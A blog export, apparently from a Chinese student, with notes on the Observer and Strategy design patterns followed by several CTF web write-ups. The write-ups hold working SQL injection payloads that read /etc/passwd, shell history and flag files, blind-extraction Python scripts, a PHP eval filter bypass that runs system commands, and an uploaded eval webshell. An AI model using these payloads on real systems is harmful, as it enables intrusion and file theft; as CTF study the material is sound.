当没有调用setChanged()方法直接调用notifyObservers()方法时，并不会给观察者传输数据。 还可以调用clearChanged()方法删除标记，hasChanged()查看标记。 观察者需要数据时，还可以向可观察者主动(pull)拉取数据 但是很遗憾，JAVA9弃用(@deprecation)了Observable与Observer…为什么？ https://github.com/v25bh145/patternDesign-code/tree/master/Observer 查看实例代码(加了注释、分类了文件) 补充: 使用了JAVA的PropertyChangeListener 类代替deprecated(已经废弃的)observer类 https://github.com/v25bh145/patternDesign-code/tree/master/UltimateDuck","tags":[{"name":"设计模式","slug":"设计模式","permalink":"https://v25bh145.github.io/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"},{"name":"《Head First 设计模式》","slug":"《Head-First-设计模式》","permalink":"https://v25bh145.github.io/tags/%E3%80%8AHead-First-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E3%80%8B/"}]},{"title":"1.策略模式-设计模式","date":"2020-12-11T17:53:00.000Z","path":"2020/12/12/coding/designPatten/1.策略模式-设计模式/","text":"设计模式-总 这几天顺手买了本《Head First 设计模式》，打算做个笔记，当然程序演示也会放在这里。 请各位配合书进行观看，这里有一些对书中抽象术语的总结与解释，并且有更完善的演示代码。 如果您发现我的笔记/演示程序有问题或是有什么建议，欢迎联系我 设计模式好处都有啥？ 程序员间模式级别的共享语言 策略模式 “当涉及维护时，为了复用目的而使用继承，结局并不完美。” 为什么”结局并不完美”呢? 当我们想要添加某一公共特性时: 我们会将其放在抽象类中，但有些子类并不需要这个特性，因此我们还需在这些不需要特性的子类中继承这个特性并置空，造成了不必要的麻烦。 我们选择另外写一个接口(特性接口)，但是这样却导致了大量需要这个特性的子类都需要写一遍这个接口的实现，出现大量的代码复用。 “找出应用中可能需要变化之处，把它们独立起来，不要和那些不需要变化的代码混在一起。” 即是说，我们要学会抽取子类中的不同点，不要试图将其复制粘贴到不同子类中从而导致混乱。 “针对接口编程，而不是针对实现编程。” 针对接口是什么意思？接口像是必须要完成的要求/约定，我们需要写出用于完成要求的行为类(行为类的定义在这里，即是行为接口的实现类)，由行为类来代替子类实现行为接口，最后再去将行为类绑定到每个子类上。 这样就不需要子类去写关于实现行为的代码了，只需将行为绑定到子类上即可，实现上已经由行为本身做好了。(能明显感觉到解耦吗？) “针对接口编程，真正的意思是针对超类型(supertype)编程。” 这里意思是，接口只是java的一个功能，我们使用的是多态功能，完全可以把接口理解为抽象类，由行为类继承抽象类。 可以更加明确地说成，超类型是指子类的变量类型完全可以是行为类。 我们可以将行为类实现的代码称为算法。 优点： 行为类被独立出了子类-抽象父类的继承关系。(“有了继承复用的好处，但是没有了继承所带来的包袱。”) 子类不需要实现重复的代码，将具体行为的实现与子类解耦开。 “有一个(HAS-A)比是一个(IS-A)更好” 即是使用变量表示”有”，相比于直接实现抽象类的抽象行为要解耦很多。 “多用组合，少用继承” 即是5.中的另外一种叙述方式。 策略模式正式的定义:”定义了算法族，分别封装起来，让它们之间可以相互替换，此模式让算法的变化独立于使用算法的客户“。 算法族:即由抽象行为接口 - 行为类构成。 相互替换: 在父类抽象类可以添加替换函数。 独立于使用算法的客户: 将子类与特征的具体行为实现解耦，使用HAS-A替代了IS-A。 https://github.com/v25bh145/patternDesign-code/tree/master/Duck 查看实例代码 (加了注释、分类了文件)","tags":[{"name":"设计模式","slug":"设计模式","permalink":"https://v25bh145.github.io/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"},{"name":"《Head First 设计模式》","slug":"《Head-First-设计模式》","permalink":"https://v25bh145.github.io/tags/%E3%80%8AHead-First-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E3%80%8B/"}]},{"title":"CTF笔记-WEB攻防-08","date":"2020-10-21T07:40:00.000Z","path":"2020/10/21/coding/ctf/ctf笔记-08/","text":"comment前置知识 git泄露 git版本控制 git版本恢复 sql二次注入(注释式构造) 利用mysql函数load_file()读取文件( + 读取二进制文件使用hex()函数) /etc/passwd关于用户信息的泄露 linux系统的历史指令文件(需有打开控制台的权限，与5.联合使用) .DS_Store泄露 入题 进入页面，只有”发帖”可以点，随便填点什么之后发现需要登录，跳转到了/login.php： burp爆破发现placeholder有提示，上burpsuite使用数字爆破一下。 嘛不过自己在爆破的时候随便猜了一下，发现是666然后过了 之后再用dirsearch扫一下: 123456789101112131415161718192021222324252627282930313233343536373839[02:49:02] Starting:[02:49:03] 403 - 289B - /.git/[02:49:03] 200 - 17B - /.git/COMMIT_EDITMSG[02:49:03] 403 - 298B - /.git/branches/[02:49:03] 200 - 92B - /.git/config[02:49:03] 200 - 145B - /.git/index[02:49:03] 200 - 73B - /.git/description[02:49:03] 403 - 295B - /.git/hooks/[02:49:03] 403 - 294B - /.git/info/[02:49:03] 200 - 240B - /.git/info/exclude[02:49:03] 403 - 294B - /.git/logs/[02:49:03] 301 - 333B - /.git/logs/refs -&gt; http://220.249.52.133:48820/.git/logs/refs/[02:49:03] 301 - 339B - /.git/logs/refs/heads -&gt; http://220.249.52.133:48820/.git/logs/refs/heads/[02:49:03] 200 - 168B - /.git/logs/refs/heads/master[02:49:03] 403 - 297B - /.git/objects/[02:49:03] 403 - 294B - /.git/refs/[02:49:03] 301 - 334B - /.git/refs/heads -&gt; http://220.249.52.133:48820/.git/refs/heads/[02:49:03] 200 - 41B - /.git/refs/heads/master[02:49:03] 301 - 333B - /.git/refs/tags -&gt; http://220.249.52.133:48820/.git/refs/tags/[02:49:03] 403 - 298B - /.htaccess.bak1[02:49:03] 403 - 298B - /.htaccess.orig[02:49:03] 403 - 300B - /.htaccess.sample[02:49:03] 403 - 298B - /.htaccess.save[02:49:03] 403 - 296B - /.htaccessBAK[02:49:03] 403 - 296B - /.htaccessOLD[02:49:03] 403 - 297B - /.htaccessOLD2[02:49:03] 403 - 295B - /.httr-oauth[02:49:04] 403 - 288B - /.php[02:49:11] 301 - 322B - /css -&gt; http://220.249.52.133:48820/css/[02:49:12] 301 - 324B - /fonts -&gt; http://220.249.52.133:48820/fonts/[02:49:12] 200 - 7KB - /index.php[02:49:12] 200 - 7KB - /index.php/login/[02:49:13] 301 - 321B - /js -&gt; http://220.249.52.133:48820/js/[02:49:13] 200 - 2KB - /login.php[02:49:14] 200 - 0B - /mysql.php[02:49:16] 403 - 297B - /server-status[02:49:16] 403 - 298B - /server-status/Task Completed git泄露好家伙，git泄露了，使用githacker下载下来.git文件 发现do_write.php几乎什么也没有，扑了个空？ git 恢复历史版本 以后在面对git泄露的漏洞时，一定要使用git log —reglog查看下历史文件，挨个恢复一遍看看 需要注意到的坑： GitHacker的运行环境为linux 当单次执行时，需要输入以下代码： 1234git initgit add -Agit commit -m \"qwq\"python GitHacker.py [url] 在获取成功后，使用以下指令： 1234567cd [that ip]# 需要进入下载好的文件夹再使用git，否则没有效果git log --reglog# 查看版本号git reset --hard [version]# 恢复历史记录# git reset --hard 2393e10f134536b2141d97819d73a68dec417106 我们终于拿到了关于SQL注入的源码了，接下来让我们开始代码审计 吧。 SQL-二次注入这是截下来的源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;?phpinclude \"mysql.php\";session_start();if($_SESSION['login'] != 'yes')&#123; header(\"Location: ./login.php\"); die();&#125;if(isset($_GET['do']))&#123;switch ($_GET['do'])&#123;case 'write': $category = addslashes($_POST['category']); $title = addslashes($_POST['title']); $content = addslashes($_POST['content']); $sql = \"insert into board set category = '$category', title = '$title', content = '$content'\"; $result = mysql_query($sql); header(\"Location: ./index.php\"); break;case 'comment': $bo_id = addslashes($_POST['bo_id']); $sql = \"select category from board where id='$bo_id'\"; $result = mysql_query($sql); $num = mysql_num_rows($result); if($num&gt;0)&#123; $category = mysql_fetch_array($result)['category']; $content = addslashes($_POST['content']); $sql = \"insert into comment set category = '$category', content = '$content', bo_id = '$bo_id'\"; $result = mysql_query($sql); &#125; header(\"Location: ./comment.php?id=$bo_id\"); break;default: header(\"Location: ./index.php\");&#125;&#125;else&#123; header(\"Location: ./index.php\");&#125;?&gt; 其中，我们需要注意的是这两段代码，我们可以从中尝试构造 12345678$sql = \"insert into board set category = '$category', title = '$title', content = '$content'\"; $sql = \"insert into comment set category = '$category', content = '$content', bo_id = '$bo_id'\"; 二次注入 - /**/构造我们可以尝试插入这样的字符串来构造SQL注入： 12345678# write页$category = '3\\', content=database(),/*';# 3', content = database(),/*# comment页$content = '*/#';# */## 最终的SQL query语句:# select into comment where category = 3', content = database(),/* and content = ...*/ and bo_id = ... 1234563&apos;, content = database(),/*# ctf3&apos;, content = (select group_concat(table_name) from information_schema.tables where table_schema = &quot;ctf&quot;),/*# board,comment,user3&apos;, content = (select group_concat(column_name) from information_schema.columns where table_schema = &quot;ctf&quot;),/*# id,category,title,content,id,bo_id,category,content,id,username,password 数据库里的字段都是已知的，看来并不能从中找到flag。 13&apos;, content = load_file(&quot;/var/www/html/flag.php&quot;),/* 读取不着，要换个思路了。 /etc/passwd尝试使用load_file进行查询，读入linux内文件： 1233&apos;, content = load_file(&quot;/etc/passwd&quot;),/*root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin libuuid:x:100:101::/var/lib/libuuid: syslog:x:101:104::/home/syslog:/bin/false mysql:x:102:105:MySQL Server,,,:/var/lib/mysql:/bin/false www:x:500:500:www:/home/www:/bin/bash 看到了/bin/bash，说明当前用户拥有使用终端的权限。 /home/www/.bash_history (在已知拥有终端权限后)1233&apos;, content = load_file(&quot;/home/www/.bash_history&quot;),/*cd /tmp/ unzip html.zip rm -f html.zip cp -r html /var/www/ cd /var/www/html/ rm -f .DS_Store service apache2 start 发现.DS_Store文件泄露漏洞，开发者只删除了/var/www/html下的.DS_Store，并没有删除/tmp/html下的.DS_Store。 .DS_Store文件泄露 关于.DS_Store文件 简单来说，可以通过.DS_Store看文件目录 13&apos;, content = hex(load_file(&quot;/tmp/html/.DS_Store&quot;)),/* 得到16进制码，放入16进制-文本字符串转换工具中: flag(?)看到了flag.php，复制下来： 123flag_8946e1ff1ee3e40f.php3&apos;, content = hex(load_file(&quot;/tmp/html/flag_8946e1ff1ee3e40f.php&quot;)),/* flag 以为这题完了？诶，还没完呢~ 将flag提交，发现不正确，被忽悠了一手！ 再去/var/www/html目录下看看，又发现了另一个flag: 13&apos;, content = hex(load_file(&quot;/var/www/html/flag_8946e1ff1ee3e40f.php&quot;)),/* 提交这个flag，这下才对了。 后话因之前unfinish中二次注入的影响，导致我认为二次注入必须写python，使用ascii一个一个按照字母去出，虽然现在明白过来了，但是写的python脚本也不愿就此删掉了，还是放上来扒hhh 1234567891011121314151617181920212223242526272829303132333435363738import requestsimport re# payload = \"', content=ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema = 'ctf') from 1 for 1)), /*\"comment_url=\"http://220.249.52.133:30981/write_do.php?do=write\"write_url=\"http://220.249.52.133:30981/write_do.php?do=comment\"flag = \"\"headers_write = &#123; 'Cookie': 'PHPSESSID=1qvvpqhq0o3raukebj5s24f5d6'&#125;headers_comment = &#123; 'Cookie': 'PHPSESSID=1qvvpqhq0o3raukebj5s24f5d6'&#125;for i in range(1, 10000): category = \"', content=ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema = 'ctf') from %d for 1)), /*\"%i post_comment = &#123; 'category': category, 'title': \"\", 'content': \"\" &#125; r1 = requests.post(comment_url,data=post_comment,headers=headers_comment) content=\"*/#\" post_write = &#123; 'content': content, 'bo_id': i &#125; r2 = requests.post(write_url, data=post_write, headers=headers_write) match = re.search(r'&lt;p&gt;(\\d+)&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;',r2.text) asc = match.group(1) print(asc) if asc == '0': break flag = flag + chr(int(asc))print(flag)","tags":[{"name":"ctf-web","slug":"ctf-web","permalink":"https://v25bh145.github.io/tags/ctf-web/"},{"name":"CTF笔记-WEB攻防","slug":"CTF笔记-WEB攻防","permalink":"https://v25bh145.github.io/tags/CTF%E7%AC%94%E8%AE%B0-WEB%E6%94%BB%E9%98%B2/"}]},{"title":"CTF笔记-WEB攻防-08","date":"2020-10-21T07:40:00.000Z","path":"2020/10/21/coding/ctf/ctf笔记-09/","text":"love_math前置知识 php代码审计 进制转换 使用进制绕过字母 使用进制绕过所有ascii字符(除1xxxxxxx开头外) 使用’{}’绕过’[]’ (数组 奇淫技巧，对开发有思路帮助) 入题 进入页面即看到php代码，审计： php审计12345678910111213141516171819202122232425262728&lt;?phperror_reporting(0);//听说你很喜欢数学，不知道你是否爱它胜过爱flagif(!isset($_GET['c']))&#123; show_source(__FILE__);&#125;else&#123; //例子 c=20-1 $content = $_GET['c']; if (strlen($content) &gt;= 80) &#123; die(\"太长了不会算\"); &#125; $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]']; foreach ($blacklist as $blackitem) &#123; if (preg_match('/' . $blackitem . '/m', $content)) &#123; die(\"请不要输入奇奇怪怪的字符\"); &#125; &#125; //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh']; preg_match_all('/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/', $content, $used_funcs); foreach ($used_funcs[0] as $func) &#123; if (!in_array($func, $whitelist)) &#123; die(\"请不要输入奇奇怪怪的函数\"); &#125; &#125; //帮你算出答案 eval('echo '.$content.';');&#125; 大意：这个网站可以帮我们计算一些数学公式，其中只可以使用给出的函数，不支持除此以外的任何字母组合，只支持数字。 属于webshell类型的题目，需要我们找出可以绕过的漏洞。 base_convert在题目给出的网站中翻找时，看到了一个进制转换函数，突然想到高进制的数字是使用字母表示的，立刻去试了试： 123?c=base_convert(35,10,36)output=&gt;z 不错，找到了输入字母的方法。 之后我们需要找到调用php其他函数的方法，通过system函数来获取webshell。 尝试构造1目标函数：system(&quot;cat flag.php&quot;) 技巧1： 执行以变量为函数名的函数123456&lt;?phpfunction func ($var) &#123; echo $var;&#125;$c = \"func\";$c(1); 有一点要说明的是，对于echo函数，由于echo的原本形式是不加括号的，所以行不通。 技巧2： 执行以函数执行结果为函数名的函数123456&lt;?phpfunction func ($var) &#123; echo $var;&#125;//echo base_convert(\"func\", 36, 10); =&gt; 739560base_convert(739560, 10, 36)(1); 尝试-构造payload 目标中含有空格和’.’，没有办法使用以上两条技巧构造，我们还需要构造出全部字符。 技巧3：只用数字，进制函数与运算符[异或]构造出所有字符 =&gt; 异或构造的要求(重点)这里先放出异或的规则： 在php中对两个字符串进行异或运算时： 运算符会先将字符串全部通过ascii表转换为二进制再进行异或，将异或的结果再重新通过ascii表转换为字符串。 因此，理论上我们可以通过字母与数字来构造出ascii的所有字符。 再放上写好了的转换函数： 12345678910function str2ascii($str)&#123; $str = mb_convert_encoding($str, 'GB2312'); $change_after = ''; for ($i = 0; $i &lt; strlen($str); $i++) &#123; $temp_str = str_pad(base_convert(ord($str[$i]), 10, 2), 8, 0, STR_PAD_LEFT); $change_after = $change_after.$temp_str.\" \"; &#125; return strtoupper($change_after);&#125; e.g:尝试转换flag.php(练习)12echo str2ascii(\"flag.php\");// 01100110 01101100 01100001 01100111 00101110 01110000 01101000 01110000 这时直接强行使用数字和字母构造当然是不可行的，因为PHP处理输入的字符串，稍微总结了下规则： 在PHP中异或构造的要求： 必须只使用数字/字母构造(范围：0: 0011 0000 9: 0011 1010 a: 0110 0001 z: 0111 1010) 单个组合必须需要出现字母(在之后会使用进制转换函数构造)，不能出现纯数字的字符串。 字符串的开头不能是0(譬如说，1就可以)。 我们先尝试第一次构造： 1234// 01100110 01101100 01100001 01100111 00101110 01110000 01101000 01110000// 00110001 00110000 00110000 00110000 ******** ******** 00110000 ******** //num-two// 01010111 01011100 01010001 01010111 ******** ******** 01011000 ******** 其中*为不能构造的部分，这是就要考虑使用三次异或了： 12345// 01100110 01101100 01100001 01100111 00101110 01110000 01101000 01110000// 00110001 00110000 00110000 00110000 ******** 00110000 00110000 00110000 //three// 00110001 00110000 00110000 00110000 ******** 00110000 00110000 00110000// 01100110 01101100 01100001 01100111 ******** 01110000 01101000 01110000 可以看出，如果需要的字符串为大多数为字符构成，使用三次构造明显更加方便(前两次中都使用相同的字符，可以使前两次的异或结果为0，这是的结果值就等于第三次中的字符) 这时再试着构造‘.’的payload： 1234567//00101110 &apos;.&apos;//00110000 &apos;0&apos;//01110001 &apos;q&apos;//01000001 &lt;=//01101111 &apos;o&apos; 将字符随便组合一下，使其满足PHP异或构造的要求： 12345678// 01100110 01101100 01100001 01100111 00101110 01110000 01101000 01110000// 00110001 00110000 00110000 00110000 01101111 00110000 00110000 00110000//1000o000// 00110001 00110000 00110000 00110000 01110001 00110000 00110000 00110000//1000q000// 01100110 01101100 01100001 01100111 00110000 01110000 01101000 01110000//flag0php 1echo base_convert(78365283840, 10, 36)^base_convert(78365377152, 10, 36)^base_convert(1221806459149, 10, 36); 问题来了，输入超限了(可以回去看源代码，有对输入的字符串长度做限制)… 因此掌握了异或构造还不行，还需要其他的知识。 技巧4： 使用{}绕过[] 可以用{}来访问下标 123456789$p = [\"example1\", \"example2\"];$i = 0;$p2 = [\"key1\" =&gt; \"example1\", \"key2\" =&gt; \"example2\"];$i2 = \"key1\";//以下四个echo均会输出example1echo $p&#123;0&#125;;echo $p&#123;$i&#125;;echo $p2&#123;\"key1\"&#125;;echo $p2&#123;$i2&#125;; 甚至以下8个都是等效的: 123456789101112131415$p = [\"example1\", \"example2\"];$i = 0;$p2 = [\"key1\" =&gt; \"example1\", \"key2\" =&gt; \"example2\"];$i2 = \"key1\";$arr_name = \"p\";$arr_name2 = \"p2\";echo \"&lt;br&gt;1:\".$p&#123;0&#125;;echo \"&lt;br&gt;2:\".$p&#123;$i&#125;;echo \"&lt;br&gt;3:\".$p2&#123;\"key1\"&#125;;echo \"&lt;br&gt;4:\".$p2&#123;$i2&#125;;echo \"&lt;br&gt;5:\".$&#123;$arr_name&#125;&#123;0&#125;;echo \"&lt;br&gt;6:\".$&#123;$arr_name&#125;&#123;$i&#125;;echo \"&lt;br&gt;7:\".$&#123;$arr_name2&#125;&#123;\"key1\"&#125;;echo \"&lt;br&gt;8:\".$&#123;$arr_name2&#125;&#123;$i2&#125;; 最终的paylode思路(缩小$_GET[“c”]长度的 折 磨 过程) 我们可以通过访问$_GET[]数组来实现字母的输入，使用?0=system&amp;1=cat+flag.php&amp;c=\\$\\_GET{0}(\\$\\_GET{1})来实现 其中，_GET可以使用上述的异或构造方式来构造。 _GET payload payload1234567891011121314151617181920212223242526// 0: 0011 0000 9: 0011 1010// a: 0110 0001 z: 0111 1010GET TO ascii:01011111 01000111 01000101 01010100TWO:00110001 00110000 00110000 001100001 0 0 001101110 01110111 01110101 01100100n w u dPAYLOAD:00110001 01110111 00110000 001100001 w 0 001101110 00110000 01110101 01100100n 0 u dbase_convert(&quot;1w00&quot;, 36, 2);10101100001000000 base_convert(&quot;n0ud&quot;, 36, 2);100000110010000000101base_convert(&quot;10101100001000000&quot;, 2, 36)^base_convert(&quot;100000110010000000101&quot;, 2, 36);$&#123;base_convert(10101100001000000, 2, 36)^base_convert(100000110010000000101, 2, 36)&#125;&#123;0&#125;($&#123;base_convert(10101100001000000, 2, 36)^base_convert(100000110010000000101, 2, 36)&#125;&#123;1&#125;) 双超出长度限制…这时可以用变量替换一波，我们注意到字母会被屏蔽，但是关键字不会被屏蔽，所以我们可以用关键字做变量名(php中关键字名可以做变量名，只要有’$‘即可)，省下一倍字符: 123$p=base_convert(&quot;10101100001000000&quot;, 2, 36)^base_convert(&quot;100000110010000000101&quot;, 2, 36);$&#123;$p&#125;&#123;0&#125;($&#123;$p&#125;&#123;1&#125;);?0=system&amp;1=cat+flag.php&amp;c=$pi=base_convert(10101100001000000, 2, 36)^base_convert(100000110010000000101, 2, 36);$&#123;$pi&#125;&#123;0&#125;($&#123;$pi&#125;&#123;1&#125;) 还是太长了…可以再选择输入十进制而不是二进制: 123456base_convert(&quot;1w00&quot;, 36, 10);88128base_convert(&quot;n0ud&quot;, 36, 10);1074181?0=system&amp;1=cat+flag.php&amp;c=$pi=base_convert(88128,10,36)^base_convert(1074181,10,36);$&#123;$pi&#125;&#123;0&#125;($&#123;$pi&#125;&#123;1&#125;) 终于成功了awa，这题真的是各种巧妙的绕过啊。","tags":[{"name":"ctf-web","slug":"ctf-web","permalink":"https://v25bh145.github.io/tags/ctf-web/"},{"name":"CTF笔记-WEB攻防","slug":"CTF笔记-WEB攻防","permalink":"https://v25bh145.github.io/tags/CTF%E7%AC%94%E8%AE%B0-WEB%E6%94%BB%E9%98%B2/"}]},{"title":"CTF笔记-WEB攻防-07","date":"2020-10-20T09:30:00.000Z","path":"2020/10/20/coding/ctf/ctf笔记-07/","text":"bug 题目目前数据库有点问题，待之后好了补充 ics-07我们的工控云管理叕叒出问题啦，点开”项目管理”，进入之后看到最下面有一行”view source”，进入页面，开始审计php: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?php session_start();if (!isset($_GET[page])) &#123; show_source(__FILE__); die();&#125;if (isset($_GET[page]) &amp;&amp; $_GET[page] != 'index.php') &#123; include('flag.php');&#125;else &#123; header('Location: ?page=flag.php');&#125;if ($_SESSION['admin']) &#123; $con = $_POST['con']; $file = $_POST['file']; $filename = \"backup/\".$file; if(preg_match('/.+\\.ph(p[3457]?|t|tml)$/i', $filename))&#123; die(\"Bad file extension\"); &#125;else&#123; chdir('uploaded'); $f = fopen($filename, 'w'); fwrite($f, $con); fclose($f); &#125;&#125;if (isset($_GET[id]) &amp;&amp; floatval($_GET[id]) !== '1' &amp;&amp; substr($_GET[id], -1) === '9') &#123; include 'config.php'; $id = mysql_real_escape_string($_GET[id]); $sql=\"select * from cetc007.user where id='$id'\"; $result = mysql_query($sql); $result = mysql_fetch_object($result);&#125; else &#123; $result = False; die();&#125;if(!$result)die(\"&lt;br &gt;something wae wrong ! &lt;br&gt;\");if($result)&#123; echo \"id: \".$result-&gt;id.\"&lt;/br&gt;\"; echo \"name:\".$result-&gt;user.\"&lt;/br&gt;\"; $_SESSION['admin'] = True;&#125; 第一段是关于页面跳转的，第二段需要获取admin之后再看，先看第三段，是关于id的，这里检测为： 浮点数不为1,且最后一位为9，则执行mysql_real_escape_string()函数，代入sql语句中 关于mysql_real_escape_string函数这是在PHP7.0即已废除的函数，模拟实际情况则以mysqli_real_escape_string(版本&gt;7.0)，我们发现‘被转义了(加了一个反斜杠\\) 我们试着输入1’9，结果发现返回了id和name，并且成功赋值了admin 自己测试说明是可行的： 123456&lt;?php$con = mysqli_connect(\"sth\", \"sth\", \"sth\");$id = \"1'9\";$id = mysqli_real_escape_string($con, $id);$sql=\"select * from cetc007.user where id='$id'\";echo $sql;//select * from cetc007.user where id='1\\'9' 用这样的格式试着查查自己的数据库： 绕过/.+\\.ph(p[3457]?|t|tml)$/i正则 精妙的构造：example.php3/4.php/../ 由此，我们便能随心所欲地写入文件了(记得文件目录是在uploaded下的backup) 1con=&lt;?php+eval($_POST[&quot;hacked&quot;]);?&gt;&amp;file=awa.php/3.php/.. 之后使用菜刀连接，得到flag即可。 后话：以后就一篇一道题了，题的难度越来越大了，写WP所需要的篇幅量也对应增大了。","tags":[{"name":"ctf-web","slug":"ctf-web","permalink":"https://v25bh145.github.io/tags/ctf-web/"},{"name":"CTF笔记-WEB攻防","slug":"CTF笔记-WEB攻防","permalink":"https://v25bh145.github.io/tags/CTF%E7%AC%94%E8%AE%B0-WEB%E6%94%BB%E9%98%B2/"}]},{"title":"CTF笔记-WEB攻防-06","date":"2020-10-14T16:00:00.000Z","path":"2020/10/15/coding/ctf/ctf笔记-06/","text":"此题解系写ctf笔记-08之时熬夜所补，所以篇幅可能略精简，望见谅。 fakebook首先dirsearch扫一遍，扫到了robors.txt，进入发现文件user.php.bak，下载，开始审计php代码。 看到注册中的$blog是有正则检测的，大概像个网页的样子，使用echo出具体的正则： 123&lt;?phpecho \"/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i\";# /^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i 进入菜鸟教程的在线工具练练匹配，发现这样的格式可以匹配到： 1https://a.ab/a?s=a 进入注册页面注册，显示注册完成，并且在跳转出的页面中发现username可以交互，点击一下进入url: 1http://220.249.52.133:43258/view.php?no=1 试着对no=1加了一发单引号，居然引起了mysql的报错，考虑SQL注入。 1?no=1+union+select+1+--+ 提示no hack，试了试/**/与大小写绕过，成功了: 1?no=1/**/unIon/**/Select+1,1,1,1+--+ 问题是不显示结果，把前面的no=1改改，发现在前面无结果报错时，后面的第二个参数能被打印在username栏中： 1?no=0/**/unIon/**/Select+1,2,3,4+--+ # username显示2 尝试查询了所有的数据库，只能发现三个： fakebook information_schema performance_schema 去fakebook查查，发现里面只有自己注册的账号信息。 load_file()我们直接使用load_file访问文件： 1?no=0/**/unIon/**/Select+1,hex(load_file(&quot;/var/www/html/flag.php&quot;)),3,4+--+ 发现flag就在HTML中 笨办法(写py练手用，实则没发现HTML中注释的flag…..)因此flag大概不在数据库中了，也许需要我们通过SQL注入显示系统文件。 1?no=0/**/unIon/**/Select+1,hex(load_file(&quot;/var/www/html/flag.php&quot;)),3,4+--+ 这样子居然报no hack的警告了，发现有关于hex的拦截，/**/与大小写绕过均不可行。问题不大，使用另外一种构造： 1?no=0/**/unIon/**/Select+1,ascii(substr((load_file(&quot;/var/www/html/flag.php&quot;)) from 1 for 1)),3,4+--+ 只能一个一个显示，这里用用python脚本(练个习)： 123456789101112131415import requestsimport reresult = \"\"for i in range(1, 1000): url = r'http://220.249.52.133:43258/view.php?no=0/**/unIon/**/Select+1,ascii(substr((load_file(\"/var/www/html/flag.php\"))' + 'from %d for 1)),3,4+--+'%i # print(url) res = requests.get(url=url) match = re.search(r\"&lt;td&gt;\\s*(\\d+)\\s*&lt;/td&gt;\", res.text) # print(res.text) asc = match.group(1) if asc == '0': break result += chr(int(asc)) # print(result)print(result) WP的办法查到表名之后，我们决定沿着数据库继续走下去，看看我们提交的数据被转储成了什么样子： 123456?no=0/**/union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()+--+# users?no=0/**/union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema=database() and table_name=&quot;users&quot;+--+# no,username,passwd,data ?no=0/**/union/**/select 1,group_concat(data),3,4 from users+--+# O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;v25bh145&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:18:&quot;https://a.ab/a?s=a&quot;;&#125; 至此，我们发现我们的信息被反序列化存在data字段中了，同时看到网页底部关于SQL的报错： 1Fatal error: Call to a member function getBlogContents() on boolean in /var/www/html/view.php on line 67 回到user.php.bak中，可以看到这个方法具体是干什么的，在data反序列化之后，里面的blog被用去解析，这里我们可以使用http(s)以外的协议来实现访问服务器内的文件 file://123O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;v25bh145&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;=&gt;?no=0/**/union/**/select 1,2,3,&apos;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;v25bh145&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&apos;+--+ 同样的，在HTML注释(这次是在底部的HTML)中发现了flag。 ics-05首先进行一波dirsearch，什么也没看到，嗯……进入设备维护中心看看扒。 发现全网页只有左上角的”云平台设备维护中心”可以点，进入了一个奇怪的url: 1/index.php?page=index 尝试随便打点什么，发现当输入纯数字与字母时，在底下可以打印(复读)出相应的数字与字母。 打开burp抓包之后使用fuzz字节注入，看看哪些字符是允许的。 结果是没有发现异常，所有除 字母 数字以外的字符均不被允许。 尝试一下SQL注入，果然也不行。 这时，写了index.php，居然反悔了Ok，开始怀疑文件包含漏洞。 